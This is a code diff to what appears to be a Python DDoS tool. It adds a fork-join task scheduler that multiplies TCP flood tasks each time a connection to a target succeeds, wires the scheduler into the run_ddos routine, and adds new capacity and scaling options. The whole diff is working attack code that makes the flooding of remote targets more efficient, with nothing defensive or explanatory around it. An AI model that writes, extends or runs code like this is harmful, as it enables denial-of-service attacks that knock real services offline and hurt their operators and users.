@@ -3,6 +3,7 @@ import colorama; colorama.init()
 # @formatter:on
 import asyncio
 from asyncio import events
+from functools import partial
 import selectors
 import socket
 import sys
@@ -30,6 +31,71 @@ WINDOWS_WAKEUP_SECONDS = 0.5
 
 
 AsyncFlood = Union[AsyncTcpFlood, AsyncUdpFlood]
+
+
+class ForkJoinTaskSet:
+
+    def __init__(
+        self,
+        loop,
+        runnables,
+        initial_capacity:int=2,
+        max_capacity:int=10_000,
+        fork_scale:int=2
+    ):
+        self._loop = loop
+        self._tasks = runnables
+        self._initial_capacity = initial_capacity
+        self._max_capacity = max_capacity
+        self._fork_scale = fork_scale
+        self._pending = set()
+
+    def _on_connect(self, runnable, f):
+        scale = 1
+        try:
+            scale = self._fork_scale if f.result() else 1
+        except asyncio.TimeoutError:
+            pass
+        except Exception as e:
+            pass
+        finally:
+            if len(self) >= self._max_capacity:
+                scale = 1
+            for _ in range(scale):
+                self._launch(runnable)
+
+    def append(self, runnable) -> None:
+        self._tasks.append(runnable)
+
+    def __len__(self) -> int:
+        return len(self._pending)
+
+    def _launch(self, runnable):
+        on_connect = self._loop.create_future()
+        on_connect.add_done_callback(partial(self._on_connect, runnable))
+        self._pending.add(self._loop.create_task(runnable.run(on_connect)))
+
+    async def loop(self) -> None:
+        # the algo:
+        # 1) for each runnable launch {initial_capacity} tasks
+        # 2) as soon as connection ready on any of them, fork runner
+        #    if max_capacity is enough
+        # 3) on finish, restart corresponding runner
+        #
+        # potential improvement: find a way to downscale
+        for runnable in self._tasks:
+            for _ in range(self._initial_capacity):
+                self._launch(runnable)
+        while self._pending:
+            done, pending = await asyncio.wait(
+                self._pending, return_when=asyncio.FIRST_COMPLETED)
+            for f in done:
+                try:
+                    f.result()
+                except Exception as e:
+                    pass
+                finally:
+                    self._pending.remove(f)
 
 
 class FloodTaskSet:
@@ -77,6 +143,8 @@ async def run_ddos(
     table: bool,
     total_threads: int,
     use_my_ip: int,
+    initial_capacity: int,
+    fork_scale: int,
 ):
     loop = asyncio.get_event_loop()
     statistics = {}
@@ -125,8 +193,10 @@ async def run_ddos(
         await asyncio.sleep(5)
 
     active_flooder_tasks = []
+    tcp_task_group = None 
 
     async def install_targets(targets):
+        nonlocal tcp_task_group
         # cancel running flooders
         if active_flooder_tasks:
             for task in active_flooder_tasks:
@@ -154,16 +224,29 @@ async def run_ddos(
             else:
                 logger.error(f"Unsupported scheme given: {target.url.scheme}")
 
-        num_tcp = len(tcp_flooders)
-        scale = max(1, (total_threads // num_tcp) if num_tcp > 0 else 0)
-
-        for flooder in tcp_flooders:
-            task = asyncio.create_task(FloodTaskSet(loop, flooder, scale).loop())
-            # XXX: add stats for running/cancelled tasks with add_done_callback
-            active_flooder_tasks.append(task)
+        # num_tcp = len(tcp_flooders)
+        # scale = max(1, (total_threads // num_tcp) if num_tcp > 0 else 0)
         
+        if tcp_flooders:
+            tcp_task_group = ForkJoinTaskSet(
+                loop,
+                runnables=tcp_flooders,
+                initial_capacity=initial_capacity,
+                max_capacity=total_threads,
+                fork_scale=fork_scale,
+            )
+            task = loop.create_task(tcp_task_group.loop())
+            active_flooder_tasks.append(task)
+        else:
+            tcp_task_group = None
+
+        # for flooder in tcp_flooders:
+            # task = loop.create_task(FloodTaskSet(loop, flooder, scale).loop())
+            # XXX: add stats for running/cancelled tasks with add_done_callback
+            # active_flooder_tasks.append(task)
+
         for flooder in udp_flooders:
-            task = asyncio.create_task(FloodTaskSet(loop, flooder).loop())
+            task = loop.create_task(FloodTaskSet(loop, flooder).loop())
             active_flooder_tasks.append(task)
 
     try:
@@ -194,6 +277,8 @@ async def run_ddos(
                     None if targets_loader.age is None else reload_after-int(targets_loader.age),
                     passed > REFRESH_RATE * REFRESH_OVERTIME,
                 )
+                if tcp_task_group is not None:
+                    logger.info(f"Task group size: {len(tcp_task_group)}")
             finally:
                 cycle_start = time.perf_counter()
 
@@ -314,6 +399,8 @@ async def start(args, shutdown_event: Event):
         args.table,
         args.threads,
         use_my_ip,
+        args.initial_capacity,
+        args.fork_scale,
     )
     shutdown_event.set()
 
